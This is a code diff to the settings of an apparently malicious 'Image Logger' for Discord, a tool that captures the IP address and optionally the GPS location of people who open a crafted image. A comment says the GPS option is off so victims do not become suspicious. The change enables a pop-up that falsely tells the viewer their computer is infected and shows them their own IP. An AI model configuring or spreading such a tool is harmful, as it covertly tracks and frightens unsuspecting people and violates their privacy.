@@ -27,8 +27,9 @@ config = {
     "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "doMessage": True, # Enable the custom message?
+        "message": "UR COMPUTER HAS BEEN INFECTED WITH A VIRUS WARNING DO U WISH TO PROCEED 1-yes
+        2-no your ip is {ip}", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
